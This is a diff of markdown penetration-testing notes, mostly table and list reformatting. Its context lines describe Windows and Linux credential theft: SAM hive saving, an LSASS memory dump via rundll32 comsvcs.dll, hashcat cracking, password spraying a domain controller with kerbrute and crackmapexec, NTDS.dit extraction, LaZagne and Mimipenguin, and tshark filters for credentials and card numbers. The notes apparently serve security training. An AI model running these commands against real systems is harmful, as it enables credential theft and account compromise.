-| `HKLM\SAM`     | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords. |
-| `HKLM\SYSTEM`  | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes. |
-| `HKLM\SECURITY`| Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
+| Registry Hive   | Description                                                                                                                                                       |
+| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
+| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
+| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
 
 </details>
 
-1. **Save** copies of the registry hives *(requires launching cmd.exe with administrative privileges)*
+1. **Save** copies of the registry hives _(requires launching cmd.exe with administrative privileges)_
 
 Save the contents of the HKLM\SAM registry hive to a file named 'sam.save':
 
@@ -3473,13 +3469,13 @@ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /us
 
 The Data Protection Application Programming Interface (DPAPI) is a set of Windows APIs used to encrypt and decrypt data blobs on a per-user basis. These encrypted blobs are employed by various Windows features and third-party applications to securely store sensitive information.
 
-| Applications              | Use of DPAPI                                                                                   |
-|--------------------------|------------------------------------------------------------------------------------------------|
-| Internet Explorer        | Password form auto-completion data (username and password for saved sites).                    |
-| Google Chrome            | Password form auto-completion data (username and password for saved sites).                    |
-| Outlook                  | Passwords for email accounts.                                                                  |
-| Remote Desktop Connection| Saved credentials for connections to remote machines.                                          |
-| Credential Manager       | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.    |
+| Applications              | Use of DPAPI                                                                                |
+| ------------------------- | ------------------------------------------------------------------------------------------- |
+| Internet Explorer         | Password form auto-completion data (username and password for saved sites).                 |
+| Google Chrome             | Password form auto-completion data (username and password for saved sites).                 |
+| Outlook                   | Passwords for email accounts.                                                               |
+| Remote Desktop Connection | Saved credentials for connections to remote machines.                                       |
+| Credential Manager        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |
 
 DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/ParrotSec/mimikatz/tree/master), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
 
@@ -3547,10 +3543,10 @@ In addition to obtaining copies of the SAM database for password hash extraction
 
 Upon initial logon, LSASS will:
 
-* Cache credentials locally in memory
-* Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
-* Enforce security policies
-* Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
+- Cache credentials locally in memory
+- Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- Enforce security policies
+- Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
 
 Before extracting credentials from LSASS, it's wise to first create a memory dump of the LSASS process. This allows us to analyze its contents offline from our attack host. Performing the attack offline provides greater flexibility—enabling faster processing and reducing the time spent on the target system, which helps minimize detection risk.
 
@@ -3568,7 +3564,7 @@ With access to an interactive graphical session on the target, we can use task m
 4. Select Create dump file
 5. A file called `lsass.DMP` is created and saved in `%temp%`.
 
-This is the file we will transfer to our attack host. 
+This is the file we will transfer to our attack host.
 
 </details>
 
@@ -3653,7 +3649,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 </tr>
 </table>
 
-**Creating a dump file using PowerShell *(with an elevated PowerShell session)***
+**Creating a dump file using PowerShell _(with an elevated PowerShell session)_**
 
 <table width="100%">
 <tr>
@@ -3675,7 +3671,7 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 </tr>
 </table>
 
-With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). 
+With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).
 
 If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack host to attempt to extract any credentials that may have been stored in LSASS process memory.
 
@@ -3863,11 +3859,11 @@ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rocky
 
 Introduced in Windows 7/Server 2008 R2, Credential Manager serves as a proprietary vault for storing authentication details (domain, web, and application credentials) in encrypted form. While Microsoft's internal workings remain undocumented, research reveals credentials are stored in protected locations:
 
-* `%USERPROFILE%\AppData\Local\Microsoft\Vault\`
-* `%USERPROFILE%\AppData\Local\Microsoft\Credentials\`
-* `%USERPROFILE%\AppData\Roaming\Microsoft\Vault\`
-* `%ProgramData%\Microsoft\Vault\`
-* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
+- `%USERPROFILE%\AppData\Local\Microsoft\Vault\`
+- `%USERPROFILE%\AppData\Local\Microsoft\Credentials\`
+- `%USERPROFILE%\AppData\Roaming\Microsoft\Vault\`
+- `%ProgramData%\Microsoft\Vault\`
+- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
 
 Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).
 
@@ -3876,9 +3872,9 @@ Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256)
 
 Microsoft often refers to the protected credential stores as Credential Lockers (previously known as Windows Vaults). While Credential Manager serves as the user-facing interface and API, the actual credentials are stored in encrypted vault or locker folders on the system.The following table lists the two types of credentials Windows stores:
 
-| Name                | Description |
-|---------------------|-------------|
-| **Web Credentials** | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge. |
+| Name                    | Description                                                                                                                                                           |
+| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Web Credentials**     | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.                             |
 | **Windows Credentials** | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |
 
 **Exporting credentials**
@@ -4006,11 +4002,11 @@ User: SRV01\herman
 
 Stored credentials are listed with the following format:
 
-| Key          | Value Description |
-|--------------|-------------------|
-| **Target**   | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier. |
-| **Type**     | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons. |
-| **User**     | The user account associated with the credential. |
+| Key             | Value Description                                                                                                                          |
+| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
+| **Target**      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                        |
+| **Type**        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                  |
+| **User**        | The user account associated with the credential.                                                                                           |
 | **Persistence** | Indicates whether a credential is saved persistently on the computer. Credentials marked with `Local machine` persistence survive reboots. |
 
 3. **Impersonate** the stored user with runas
@@ -4218,7 +4214,6 @@ When a dictionary attack is appropriate, tailoring it to the target organization
 
 Here are a few typical patterns to consider:
 
-
 | **Username Convention**           | **Practical Example for Jane Jill Doe** |
 | --------------------------------- | --------------------------------------- |
 | firstinitiallastname              | jdoe                                    |
@@ -4239,10 +4234,10 @@ A common tactic for discovering corporate username formats involves leveraging p
 
 Querying `@exampledomain.com` on Google often reveals valid email formats from:
 
-* Employee directories
-* Press releases
-* Conference attendee lists
-* GitHub commits (if corporate emails are exposed)
+- Employee directories
+- Press releases
+- Conference attendee lists
+- GitHub commits (if corporate emails are exposed)
 
 2. **Social Media Scraping**
 
@@ -4252,8 +4247,8 @@ Tools like LinkedIn Scraper or theHarvester can correlate names/roles with email
 
 Search `site:exampledomain.com filetype:pdf` to find:
 
-* Author fields in PDF properties (often contains internal usernames)
-* Watermarks in internal docs
+- Author fields in PDF properties (often contains internal usernames)
+- Watermarks in internal docs
 
 </details>
 
@@ -4262,11 +4257,11 @@ Search `site:exampledomain.com filetype:pdf` to find:
 
 After gathering employee names from OSINT research (e.g., LinkedIn, company websites), create a formatted username list for spraying attacks. For this demonstration, we’ll use a small sample set:
 
-* Ben Williamson  
-* Bob Burgerstien  
-* Jim Stevenson  
-* Jill Johnson  
-* Jane Doe  
+- Ben Williamson
+- Bob Burgerstien
+- Jim Stevenson
+- Jill Johnson
+- Jane Doe
 
 <table width="100%">
 <tr>
@@ -4412,7 +4407,7 @@ kerbrute userenum --dc <DC_IP> -d exampledomain.local ~/usernames.txt
 <details>
 <summary><h4>Launching a brute-force attack</h4></summary>
 
-Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC. 
+Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC.
 
 **Option 1: crackmapexec**
 
@@ -4517,7 +4512,6 @@ Once credentials are obtained, we can attempt to gain remote access to the Domai
 NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. The `NTDS.dit` file, located at `%systemroot%\NTDS` on domain controllers, is the core database of Active Directory—“.dit” stands for Directory Information Tree. This file contains all domain usernames, password hashes, and critical schema data. If an attacker captures it, they could potentially compromise every account in the domain.
 
 We have two options to obtain this file:
-
 
 <details>
 <summary><h4>Option 1: Automatic</h4></summary>
@@ -4904,20 +4898,20 @@ Users may store passwords in files on the system, and default credentials might 
 
 Here are some helpful key terms we can use that can help us discover some credentials:
 
-* Passwords
-* Passphrases
-* Keys
-* Username
-* User account
-* Creds
-* Users
-* Passkeys
-* configuration
-* dbcredential
-*  dbpassword
-* pwd
-* Login
-* Credentials
+- Passwords
+- Passphrases
+- Keys
+- Username
+- User account
+- Creds
+- Users
+- Passkeys
+- configuration
+- dbcredential
+- dbpassword
+- pwd
+- Login
+- Credentials
 
 </details>
 
@@ -4938,19 +4932,19 @@ We can also leverage third-party tools like [LaZagne](https://github.com/Alessan
 
 Some of the common modules are described in the table below:
 
-| Module     | Description                                                                                              |
-|------------|----------------------------------------------------------------------------------------------------------|
-| browsers   | Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera          |
-| chats      | Extracts passwords from various chat applications including Skype                                         |
-| mails      | Searches through mailboxes for passwords including Outlook and Thunderbird                               |
-| memory     | Dumps passwords from memory, targeting KeePass and LSASS                                                  |
-| sysadmin   | Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP         |
-| windows    | Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more                 |
-| wifi       | Dumps WiFi credentials                                                                                    |
+| Module   | Description                                                                                       |
+| -------- | ------------------------------------------------------------------------------------------------- |
+| browsers | Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera   |
+| chats    | Extracts passwords from various chat applications including Skype                                 |
+| mails    | Searches through mailboxes for passwords including Outlook and Thunderbird                        |
+| memory   | Dumps passwords from memory, targeting KeePass and LSASS                                          |
+| sysadmin | Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP |
+| windows  | Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more         |
+| wifi     | Dumps WiFi credentials                                                                            |
 
->**NOTE:** Web browsers are some of the most interestings placed to search for credentials, due to the fact that many of them offer built-in credential storage.
+> **NOTE:** Web browsers are some of the most interestings placed to search for credentials, due to the fact that many of them offer built-in credential storage.
 
->**NOTE:** In the most popular browsers, such as Google Chrome, Microsoft Edge, and Firefox, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as firefox_decrypt and decrypt-chrome-passwords.
+> **NOTE:** In the most popular browsers, such as Google Chrome, Microsoft Edge, and Firefox, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as firefox_decrypt and decrypt-chrome-passwords.
 
 It's a good practice to keep the latest [LaZagne executable](https://github.com/AlessandroZ/LaZagne/releases/) on our attack host, allowing us to quickly transfer it to the target system when needed.
 
@@ -5042,15 +5036,15 @@ There are countless tools and keywords available for credential hunting on Windo
 
 Here are some other places we should keep in mind when credential hunting:
 
-* Passwords in Group Policy in the SYSVOL share
-* Passwords in scripts in the SYSVOL share
-* Password in scripts on IT shares
-* Passwords in web.config files on dev machines and IT shares
-* Password in unattend.xml
-* Passwords in the AD user or computer description fields
-* KeePass databases (if we are able to guess or crack the master password)
-* Found on user systems and shares
-* Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint
+- Passwords in Group Policy in the SYSVOL share
+- Passwords in scripts in the SYSVOL share
+- Password in scripts on IT shares
+- Passwords in web.config files on dev machines and IT shares
+- Password in unattend.xml
+- Passwords in the AD user or computer description fields
+- KeePass databases (if we are able to guess or crack the master password)
+- Found on user systems and shares
+- Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint
 
 </details>
 
@@ -5072,33 +5066,30 @@ Linux systems primarily authenticate users through Pluggable Authentication Modu
 
 **Core PAM Modules**
 
-* `pam_unix.so`/`pam_unix2.so`:
+- `pam_unix.so`/`pam_unix2.so`:
+  - Handle traditional Unix authentication (`/etc/passwd`, `/etc/shadow`)
 
-    * Handle traditional Unix authentication (`/etc/passwd`, `/etc/shadow`)
+  - Manage password changes and session setup
 
-    * Manage password changes and session setup
-
-    * Default location: `/usr/lib/x86_64-linux-gnu/security`/ (Debian/Ubuntu)
+  - Default location: `/usr/lib/x86_64-linux-gnu/security`/ (Debian/Ubuntu)
 
 **Authentication Workflow**
 
 1. User Verification:
+   - Validates credentials against system databases
 
-    * Validates credentials against system databases
-
-    * Enforces password policies (aging, complexity)
+   - Enforces password policies (aging, complexity)
 
 2. Session Management:
+   - Logs successful/attempted logins (`/var/log/auth.log`)
 
-    * Logs successful/attempted logins (`/var/log/auth.log`)
-
-    * Applies resource limits (ulimit)
+   - Applies resource limits (ulimit)
 
 **Security Implications**
 
-* Configuration: Defined in `/etc/pam.d/` (e.g., sshd, sudo)
+- Configuration: Defined in `/etc/pam.d/` (e.g., sshd, sudo)
 
-* Customization: Supports LDAP/AD integration via `pam_ldap.so`
+- Customization: Supports LDAP/AD integration via `pam_ldap.so`
 
 <details>
 <summary><h3>Passwd file</h3></summary>
@@ -5120,15 +5111,15 @@ john:x:1000:1000:,,,:/home/john:/bin/bash
 </tr>
 </table>
 
-| Field           | Value               |
-|-----------------|---------------------|
-| Username        | john                |
-| Password        | x                   |
-| User ID         | 1000                |
-| Group ID        | 1000                |
-| GECOS           | ,,,                 |
-| Home directory  | /home/john          |
-| Default shell   | /bin/bash           |
+| Field          | Value      |
+| -------------- | ---------- |
+| Username       | john       |
+| Password       | x          |
+| User ID        | 1000       |
+| Group ID       | 1000       |
+| GECOS          | ,,,        |
+| Home directory | /home/john |
+| Default shell  | /bin/bash  |
 
 The most important field for our purposes in the `/etc/passwd` file is the password field, which can contain different types of entries. On very old systems, this field may hold the actual password hash, but on modern systems, password hashes are stored in /etc/shadow, which we'll examine later.
 
@@ -5226,19 +5217,19 @@ john:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
 </tr>
 </table>
 
-| Field             | Value                                      |
-|-------------------|--------------------------------------------|
-| Username          | john                                |
-| Password          | `$y$j9T$3QSBB6CbHEu...f8Ms`         |
-| Last change       | 18955                                      |
-| Min age           | 0                                          |
-| Max age           | 99999                                      |
-| Warning period    | 7                                          |
-| Inactivity period | -                                          |
-| Expiration date   | -                                          |
-| Reserved field    | -                                          |
+| Field             | Value                       |
+| ----------------- | --------------------------- |
+| Username          | john                        |
+| Password          | `$y$j9T$3QSBB6CbHEu...f8Ms` |
+| Last change       | 18955                       |
+| Min age           | 0                           |
+| Max age           | 99999                       |
+| Warning period    | 7                           |
+| Inactivity period | -                           |
+| Expiration date   | -                           |
+| Reserved field    | -                           |
 
-If the Password field contains a character such as ! or *, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the Password field is empty, meaning no password is required for login.
+If the Password field contains a character such as ! or \*, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the Password field is empty, meaning no password is required for login.
 The Password field also follows a particular format, from which we can extract additional information:
 
 <table width="100%">
@@ -5259,15 +5250,15 @@ $<id>$<salt>$<hashed>
 As we can see here, the hashed passwords are divided into three parts. The ID value specifies which cryptographic hash algorithm was used, typically one of the following:
 
 | ID   | Cryptographic Hash Algorithm |
-|------|-------------------------------|
-| 1    | MD5                           |
-| 2a   | Blowfish                      |
-| 5    | SHA-256                       |
-| 6    | SHA-512                       |
-| sha1 | SHA1crypt                     |
-| y    | Yescrypt                      |
-| gy   | Gost-yescrypt                 |
-| 7    | Scrypt                        |
+| ---- | ---------------------------- |
+| 1    | MD5                          |
+| 2a   | Blowfish                     |
+| 5    | SHA-256                      |
+| 6    | SHA-512                      |
+| sha1 | SHA1crypt                    |
+| y    | Yescrypt                     |
+| gy   | Gost-yescrypt                |
+| 7    | Scrypt                       |
 
 Many Linux distributions, including Debian, now use yescrypt as the default hashing algorithm. On older systems, however, we may still encounter other hashing methods that can potentially be cracked.
 
@@ -5309,10 +5300,10 @@ cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgz
 </tr>
 </table>
 
-The presence of multiple cry0l1t3 entries with MD5 ($1$) hashes in the file reveals critical security concerns. 
+The presence of multiple cry0l1t3 entries with MD5 ($1$) hashes in the file reveals critical security concerns.
 
-* MD5 ($1$) is cryptographically broken (collisions since 2004)
-* No salting in legacy implementations (pre-2008 Linux)
+- MD5 ($1$) is cryptographically broken (collisions since 2004)
+- No salting in legacy implementations (pre-2008 Linux)
 
 This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or applications. Recognizing these patterns can greatly improve our chances of correctly guessing the password.
 
@@ -5418,10 +5409,10 @@ We can imagine that we have successfully gained access to a system via a vulnera
 
 There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:
 
-* **Files** including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
-* **History** including logs, and command-line history
-* **Memory** including cache, and in-memory processing
-* **Key-rings** such as browser stored credentials
+- **Files** including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
+- **History** including logs, and command-line history
+- **Memory** including cache, and in-memory processing
+- **Key-rings** such as browser stored credentials
 
 Enumerating all these categories will allow us to increase the probability of successfully finding out - with some ease - credentials of existing users on the system.
 
@@ -5432,12 +5423,12 @@ Every environment is different, so our approach should adapt to the specific cir
 
 A core principle of Linux is that everything is a file, so it's essential to apply this mindset when searching for valuable data. We should identify and inspect files based on specific categories relevant to our objectives. Key file types to examine include:
 
-* Configuration files
-* Databases
-* Notes
-* Scripts
-* Cron jobs
-* SSH keys
+- Configuration files
+- Databases
+- Notes
+- Scripts
+- Cron jobs
+- SSH keys
 
 **Searching for configuration files**
 
@@ -5653,27 +5644,27 @@ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|
 
 An essential concept of Linux systems is log files that are stored in text files. The entirety of log files can be divided into four categories:
 
-* Application logs
-* Event logs
-* Service logs
-* System logs
+- Application logs
+- Event logs
+- Service logs
+- System logs
 
 Many different logs exist on the system:
 
-| File                  | Description                                      |
-|-----------------------|--------------------------------------------------|
-| `/var/log/messages`   | Generic system activity logs                     |
-| `/var/log/syslog`     | Generic system activity logs                     |
-| `/var/log/auth.log`   | (Debian) All authentication related logs         |
-| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs  |
-| `/var/log/boot.log`   | Booting information                              |
-| `/var/log/dmesg`      | Hardware and drivers related information and logs|
-| `/var/log/kern.log`   | Kernel related warnings, errors and logs         |
-| `/var/log/faillog`    | Failed login attempts                            |
-| `/var/log/cron`       | Information related to cron jobs                 |
-| `/var/log/mail.log`   | All mail server related logs                     |
-| `/var/log/httpd`      | All Apache related logs                          |
-| `/var/log/mysqld.log` | All MySQL server related logs                    |
+| File                  | Description                                       |
+| --------------------- | ------------------------------------------------- |
+| `/var/log/messages`   | Generic system activity logs                      |
+| `/var/log/syslog`     | Generic system activity logs                      |
+| `/var/log/auth.log`   | (Debian) All authentication related logs          |
+| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs   |
+| `/var/log/boot.log`   | Booting information                               |
+| `/var/log/dmesg`      | Hardware and drivers related information and logs |
+| `/var/log/kern.log`   | Kernel related warnings, errors and logs          |
+| `/var/log/faillog`    | Failed login attempts                             |
+| `/var/log/cron`       | Information related to cron jobs                  |
+| `/var/log/mail.log`   | All mail server related logs                      |
+| `/var/log/httpd`      | All Apache related logs                           |
+| `/var/log/mysqld.log` | All MySQL server related logs                     |
 
 </details>
 
@@ -5685,9 +5676,9 @@ Many different logs exist on the system:
 
 [Mimipenguin](https://github.com/huntergregal/mimipenguin) is a post-exploitation utility designed to extract cached credentials from Linux systems by targeting sensitive memory and file storage locations. It can retrieves credentials for:
 
-* **Logged-in users** (GNOME/KDE sessions)
-* **Web browsers** (Chrome, Firefox stored passwords)
-* **System services** (SSH keys, sudo tokens)
+- **Logged-in users** (GNOME/KDE sessions)
+- **Web browsers** (Chrome, Firefox stored passwords)
+- **System services** (SSH keys, sudo tokens)
 
 1. **Install** Mimipenguin
 
@@ -5813,29 +5804,29 @@ sudo python3 laZagne.py all
 
 The passwords and hashes we can obtain come from the following sources but are not limited to:
 
-* Wifi
-* Wpa_supplicant
-* Libsecret
-* Kwallet
-* Chromium-based
-* CLI
-* Mozilla
-* Thunderbird
-* Git
-* ENV variables
-* Grub
-* Fstab
-* AWS
-* Filezilla
-* Gftp
-* SSH
-* Apache
-* Shadow
-* Docker
-* Keepass
-* Mimipy
-* Sessions
-* Keyrings
+- Wifi
+- Wpa_supplicant
+- Libsecret
+- Kwallet
+- Chromium-based
+- CLI
+- Mozilla
+- Thunderbird
+- Git
+- ENV variables
+- Grub
+- Fstab
+- AWS
+- Filezilla
+- Gftp
+- SSH
+- Apache
+- Shadow
+- Docker
+- Keepass
+- Mimipy
+- Sessions
+- Keyrings
 
 </details>
 
@@ -6082,24 +6073,24 @@ python decrypt_chrome_password.py
 
 Despite widespread TLS adoption, legacy systems and misconfigurations often expose sensitive data through unencrypted protocols. These vulnerabilities enable attackers to harvest credentials directly from network traffic.
 
-| Unencrypted Protocol | Encrypted Counterpart         | Description                                                                 |
-|----------------------|------------------------------|-----------------------------------------------------------------------------|
-| HTTP                 | HTTPS                        | Used for transferring web pages and resources over the internet.            |
-| FTP                  | FTPS/SFTP                    | Used for transferring files between a client and a server.                  |
-| SNMP                 | SNMPv3 (with encryption)     | Used for monitoring and managing network devices like routers and switches.  |
-| POP3                 | POP3S                        | Retrieves emails from a mail server to a local client.                      |
-| IMAP                 | IMAPS                        | Accesses and manages email messages directly on the mail server.            |
-| SMTP                 | SMTPS                        | Sends email messages from client to server or between mail servers.         |
-| LDAP                 | LDAPS                        | Queries and modifies directory services like user credentials and roles.    |
-| RDP                  | RDP (with TLS)               | Provides remote desktop access to Windows systems.                          |
-| DNS (Traditional)    | DNS over HTTPS (DoH)         | Resolves domain names into IP addresses.                                    |
-| SMB                  | SMB over TLS (SMB 3.0)       | Shares files, printers, and other resources over a network.                 |
-| VNC                  | VNC with TLS/SSL             | Allows graphical remote control of another computer.                        |
+| Unencrypted Protocol | Encrypted Counterpart    | Description                                                                 |
+| -------------------- | ------------------------ | --------------------------------------------------------------------------- |
+| HTTP                 | HTTPS                    | Used for transferring web pages and resources over the internet.            |
+| FTP                  | FTPS/SFTP                | Used for transferring files between a client and a server.                  |
+| SNMP                 | SNMPv3 (with encryption) | Used for monitoring and managing network devices like routers and switches. |
+| POP3                 | POP3S                    | Retrieves emails from a mail server to a local client.                      |
+| IMAP                 | IMAPS                    | Accesses and manages email messages directly on the mail server.            |
+| SMTP                 | SMTPS                    | Sends email messages from client to server or between mail servers.         |
+| LDAP                 | LDAPS                    | Queries and modifies directory services like user credentials and roles.    |
+| RDP                  | RDP (with TLS)           | Provides remote desktop access to Windows systems.                          |
+| DNS (Traditional)    | DNS over HTTPS (DoH)     | Resolves domain names into IP addresses.                                    |
+| SMB                  | SMB over TLS (SMB 3.0)   | Shares files, printers, and other resources over a network.                 |
+| VNC                  | VNC with TLS/SSL         | Allows graphical remote control of another computer.                        |
 
 <details>
 <summary><h3>🦈 Wireshark</h3></summary>
 
-Wireshark is a well-known packet analyzer that comes pre-installed on nearly all penetration testing Linux distributions. It features a powerful filtering engine, allowing efficient analysis of both live and captured network traffic. 
+Wireshark is a well-known packet analyzer that comes pre-installed on nearly all penetration testing Linux distributions. It features a powerful filtering engine, allowing efficient analysis of both live and captured network traffic.
 
 **Install**
 
@@ -6130,99 +6121,99 @@ wireshark --version
 <details>
 <summary><h4>1. Basic Commands</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap` | Read PCAP file |
-| `tshark -i eth0` | Live capture on eth0 interface |
-| `tshark -r file.pcap -c 100` | Show only first 100 packets |
-| `tshark -r file.pcap -q` | Quiet mode (statistics only) |
+| Command                      | Description                    |
+| ---------------------------- | ------------------------------ |
+| `tshark -r file.pcap`        | Read PCAP file                 |
+| `tshark -i eth0`             | Live capture on eth0 interface |
+| `tshark -r file.pcap -c 100` | Show only first 100 packets    |
+| `tshark -r file.pcap -q`     | Quiet mode (statistics only)   |
 
 </details>
 
 <details>
 <summary><h4>2. Advanced Filtering</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -Y "http"` | Filter HTTP traffic |
-| `tshark -r file.pcap -Y "ip.src == 192.168.1.1"` | Filter by source IP |
+| Command                                                   | Description                 |
+| --------------------------------------------------------- | --------------------------- |
+| `tshark -r file.pcap -Y "http"`                           | Filter HTTP traffic         |
+| `tshark -r file.pcap -Y "ip.src == 192.168.1.1"`          | Filter by source IP         |
 | `tshark -r file.pcap -Y "dns.qry.name contains 'google'"` | Search specific DNS queries |
-| `tshark -r file.pcap -Y "tcp.port == 445"` | Filter by TCP port |
+| `tshark -r file.pcap -Y "tcp.port == 445"`                | Filter by TCP port          |
 
 </details>
 
 <details>
 <summary><h4>3. Credential Extraction</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -Y "http.request.method == POST" -T json` | Extract HTTP POST form data |
-| `tshark -r file.pcap -Y "ftp.request.command == USER \|\| ftp.request.command == PASS"` | Capture FTP credentials |
-| `tshark -r file.pcap -Y "smb \|\| nbns \|\| dcerpc"` | Analyze SMB traffic |
+| Command                                                                                 | Description                 |
+| --------------------------------------------------------------------------------------- | --------------------------- |
+| `tshark -r file.pcap -Y "http.request.method == POST" -T json`                          | Extract HTTP POST form data |
+| `tshark -r file.pcap -Y "ftp.request.command == USER \|\| ftp.request.command == PASS"` | Capture FTP credentials     |
+| `tshark -r file.pcap -Y "smb \|\| nbns \|\| dcerpc"`                                    | Analyze SMB traffic         |
 
 </details>
 
 <details>
 <summary><h4>4. Protocol Analysis</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -Y "tls.handshake"` | Show TLS/SSL handshakes |
-| `tshark -r file.pcap -Y "icmp"` | Filter ICMP traffic (Ping) |
-| `tshark -r file.pcap -Y "ssh.protocol"` | Analyze SSH connections |
+| Command                                  | Description                |
+| ---------------------------------------- | -------------------------- |
+| `tshark -r file.pcap -Y "tls.handshake"` | Show TLS/SSL handshakes    |
+| `tshark -r file.pcap -Y "icmp"`          | Filter ICMP traffic (Ping) |
+| `tshark -r file.pcap -Y "ssh.protocol"`  | Analyze SSH connections    |
 
 </details>
 
 <details>
 <summary><h4>5. Data Export</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -Y "http" -w http_traffic.pcap` | Export HTTP traffic to new PCAP |
-| `tshark -r file.pcap --export-objects "http,export_dir"` | Extract files transferred via HTTP |
-| `tshark -r file.pcap -T fields -e http.host -e http.request.uri` | Export specific fields to text |
+| Command                                                          | Description                        |
+| ---------------------------------------------------------------- | ---------------------------------- |
+| `tshark -r file.pcap -Y "http" -w http_traffic.pcap`             | Export HTTP traffic to new PCAP    |
+| `tshark -r file.pcap --export-objects "http,export_dir"`         | Extract files transferred via HTTP |
+| `tshark -r file.pcap -T fields -e http.host -e http.request.uri` | Export specific fields to text     |
 
 </details>
 
 <details>
 <summary><h4>6. Statistics</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -qz io,phs` | Protocol hierarchy statistics |
-| `tshark -r file.pcap -z conv,tcp` | TCP conversations |
-| `tshark -r file.pcap -z http_req,tree` | HTTP request summary |
+| Command                                | Description                   |
+| -------------------------------------- | ----------------------------- |
+| `tshark -r file.pcap -qz io,phs`       | Protocol hierarchy statistics |
+| `tshark -r file.pcap -z conv,tcp`      | TCP conversations             |
+| `tshark -r file.pcap -z http_req,tree` | HTTP request summary          |
 
 </details>
 
 <details>
 <summary><h4>7. Pattern Searching</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -Y "frame matches '[0-9]{13,16}'"` | Find credit card numbers |
